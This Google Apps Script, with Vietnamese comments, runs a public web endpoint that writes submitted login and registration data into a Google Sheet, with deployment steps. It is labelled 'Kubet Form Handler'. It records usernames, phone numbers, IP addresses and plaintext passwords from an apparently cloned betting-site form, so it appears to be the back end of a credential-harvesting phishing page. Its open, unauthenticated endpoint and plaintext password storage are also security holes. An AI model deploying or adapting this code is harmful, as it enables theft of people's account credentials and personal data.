// ==========================================
// Google Apps Script - Auto Create Sheets + Headers
// ==========================================

function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);

    var spreadsheetId = '1aIcPJzzLSQo9cvkPChcggzNeiyoS26ShMu5TSo05Z6A';
    var ss = SpreadsheetApp.openById(spreadsheetId);

    var sheetName = data.type === 'login' ? 'DangNhap' : 'DangKy';
    var sheet = ss.getSheetByName(sheetName);

    // Nếu sheet chưa tồn tại → tự động tạo mới + thêm header
    if (!sheet) {
      sheet = ss.insertSheet(sheetName);
      if (data.type === 'login') {
        sheet.appendRow(['ThoiGian','SoDienThoai','TaiKhoan','Loai','IP']);
      } else {
        sheet.appendRow(['ThoiGian','MaGioiThieu','TaiKhoan','BietDanh','MatKhau','SoDienThoai','Loai','IP']);
      }
      // Format header: in đậm, nền xám nhạt
      var headerRange = sheet.getRange(1, 1, 1, sheet.getLastColumn());
      headerRange.setFontWeight('bold');
      headerRange.setBackground('#e5e7eb');
    }

    var row = [];
    var now = new Date();

    if (data.type === 'login') {
      row = [now, data.phone || '', data.username || '', 'Đăng nhập', data.ip || ''];
    } else {
      row = [now, data.referralCode || '', data.account || '', data.nickname || '', data.password || '', data.phone || '', 'Đăng ký', data.ip || ''];
    }

    sheet.appendRow(row);

    return ContentService.createTextOutput(JSON.stringify({
      status: 'success',
      message: 'Đã lưu vào Google Sheet'
    })).setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.toString()
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({
    status: 'ok',
    message: 'Google Apps Script đang chạy'
  })).setMimeType(ContentService.MimeType.JSON);
}


// ==========================================
// 3. DEPLOY WEB APP (QUAN TRỌNG!)
// ==========================================
// Bước 1: Trong Apps Script, click nút "Deploy" → "New deployment"
// Bước 2: Click biểu tượng bánh răng → chọn "Web app"
// Bước 3: Điền:
//         - Description: "Kubet Form Handler"
//         - Execute as: Me
//         - Who has access: ANYONE
// Bước 4: Click "Deploy", xác nhận quyền
// Bước 5: Copy URL Web App (dạng: https://script.google.com/macros/s/XXXX/exec)
// Bước 6: Vào lại code, thay 'YOUR_SPREADSHEET_ID' bằng ID thật
// Bước 7: Deploy lại để cập nhật


// ==========================================
// 4. LẤY SPREADSHEET ID
// ==========================================
// Mở Google Sheet → nhìn lên URL:
// https://docs.google.com/spreadsheets/d/1ABC123xyz789/edit
//                           ^^^^^^^^^^^^^^^^
//                           Đây là Spreadsheet ID
// Copy phần này, paste vào code thay chỗ YOUR_SPREADSHEET_ID